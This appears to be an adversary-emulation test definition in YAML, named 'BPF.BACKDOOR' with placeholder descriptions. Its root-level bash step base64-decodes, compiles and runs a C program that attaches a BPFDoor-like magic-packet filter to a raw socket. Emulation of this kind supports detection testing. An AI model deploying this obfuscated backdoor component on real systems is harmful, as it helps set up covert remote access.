attack_technique: Test
display_name: BPF.BACKDOOR
atomic_tests:
- name: Test
  description: Test
  supported_platforms:
    - linux
    - containers
  input_arguments:
    TmpPath:
      description: Path to use for the temporary files
      type: Path
      default: /tmp/
    TmpName:
      description: Name to use for the temporary files
      type: String
      default: prog
  executor:
    command: |
      echo I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxhcnBhL2luZXQuaD4KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4KI2luY2x1ZGUgPGxpbnV4L2lmX2V0aGVyLmg+CiNpbmNsdWRlIDxsaW51eC9maWx0ZXIuaD4KCmludCBtYWluKGludCBhcmdjLCBjaGFyKiBhcmd2W10pIHsKICAgIHN0cnVjdCBzb2NrX2Zwcm9nIGZpbHRlcjsKICAgIHN0cnVjdCBzb2NrX2ZpbHRlciBicGZfY29kZVtdID0gewogICAgICAgICAgICAgICAgIHsgMHgyOCwgMCwgMCwgMHgwMDAwMDAwYyB9LAogICAgICAgICAgICAgICAgIHsgMHgxNSwgMCwgMjcsIDB4MDAwMDA4MDAgfSwKICAgICAgICAgICAgICAgICB7IDB4MzAsIDAsIDAsIDB4MDAwMDAwMTcgfSwKICAgICAgICAgICAgICAgICB7IDB4MTUsIDAsIDUsIDB4MDAwMDAwMTEgfSwKICAgICAgICAgICAgICAgICB7IDB4MjgsIDAsIDAsIDB4MDAwMDAwMTQgfSwKICAgICAgICAgICAgICAgICB7IDB4NDUsIDIzLCAwLCAweDAwMDAxZmZmIH0sCiAgICAgICAgICAgICAgICAgeyAweGIxLCAwLCAwLCAweDAwMDAwMDBlIH0sCiAgICAgICAgICAgICAgICAgeyAweDQ4LCAwLCAwLCAweDAwMDAwMDE2IH0sCiAgICAgICAgICAgICAgICAgeyAweDE1LCAxOSwgMjAsIDB4MDAwMDcyNTUgfSwKICAgICAgICAgICAgICAgICB7IDB4MTUsIDAsIDcsIDB4MDAwMDAwMDEgfSwKICAgICAgICAgICAgICAgICB7IDB4MjgsIDAsIDAsIDB4MDAwMDAwMTQgfSwKICAgICAgICAgICAgICAgICB7IDB4NDUsIDE3LCAwLCAweDAwMDAxZmZmIH0sCiAgICAgICAgICAgICAgICAgeyAweGIxLCAwLCAwLCAweDAwMDAwMDBlIH0sCiAgICAgICAgICAgICAgICAgeyAweDQ4LCAwLCAwLCAweDAwMDAwMDE2IH0sCiAgICAgICAgICAgICAgICAgeyAweDE1LCAwLCAxNCwgMHgwMDAwNzI1NSB9LAogICAgICAgICAgICAgICAgIHsgMHg1MCwgMCwgMCwgMHgwMDAwMDAwZSB9LAogICAgICAgICAgICAgICAgIHsgMHgxNSwgMTEsIDEyLCAweDAwMDAwMDA4IH0sCiAgICAgICAgICAgICAgICAgeyAweDE1LCAwLCAxMSwgMHgwMDAwMDAwNiB9LAogICAgICAgICAgICAgICAgIHsgMHgyOCwgMCwgMCwgMHgwMDAwMDAxNCB9LAogICAgICAgICAgICAgICAgIHsgMHg0NSwgOSwgMCwgMHgwMDAwMWZmZiB9LAogICAgICAgICAgICAgICAgIHsgMHhiMSwgMCwgMCwgMHgwMDAwMDAwZSB9LAogICAgICAgICAgICAgICAgIHsgMHg1MCwgMCwgMCwgMHgwMDAwMDAxYSB9LAogICAgICAgICAgICAgICAgIHsgMHg1NCwgMCwgMCwgMHgwMDAwMDBmMCB9LAogICAgICAgICAgICAgICAgIHsgMHg3NCwgMCwgMCwgMHgwMDAwMDAwMiB9LAogICAgICAgICAgICAgICAgIHsgMHhjLCAwLCAwLCAweDAwMDAwMDAwIH0sCiAgICAgICAgICAgICAgICAgeyAweDcsIDAsIDAsIDB4MDAwMDAwMDAgfSwKICAgICAgICAgICAgICAgICB7IDB4NDgsIDAsIDAsIDB4MDAwMDAwMGUgfSwKICAgICAgICAgICAgICAgICB7IDB4MTUsIDAsIDEsIDB4MDAwMDUyOTMgfSwKICAgICAgICAgICAgICAgICB7IDB4NiwgMCwgMCwgMHgwMDAwZmZmZiB9LAogICAgICAgICAgICAgICAgIHsgMHg2LCAwLCAwLCAweDAwMDAwMDAwIH0sCiAgICAgICAgIH07CiAgICBmaWx0ZXIubGVuID0gc2l6ZW9mKGJwZl9jb2RlKS9zaXplb2YoYnBmX2NvZGVbMF0pOwogICAgZmlsdGVyLmZpbHRlciA9IGJwZl9jb2RlOwogICAgaW50IHNvY2sgPSBzb2NrZXQoUEZfUEFDS0VULCBTT0NLX1JBVywgaHRvbnMoRVRIX1BfSVApKTsKICAgIHNldHNvY2tvcHQoc29jaywgU09MX1NPQ0tFVCwgU09fQVRUQUNIX0ZJTFRFUiwgJmZpbHRlciwgc2l6ZW9mKGZpbHRlcikpOwp9Cg== | base64 -d > "#{TmpPath}#{TmpName}".c
      gcc "#{TmpPath}#{TmpName}".c -o "#{TmpPath}#{TmpName}"
      chmod +x "#{TmpPath}#{TmpName}"
      "#{TmpPath}#{TmpName}"
    cleanup_command:
      rm "#{TmpPath}#{TmpName}"*
    name: bash
    elevation_required: true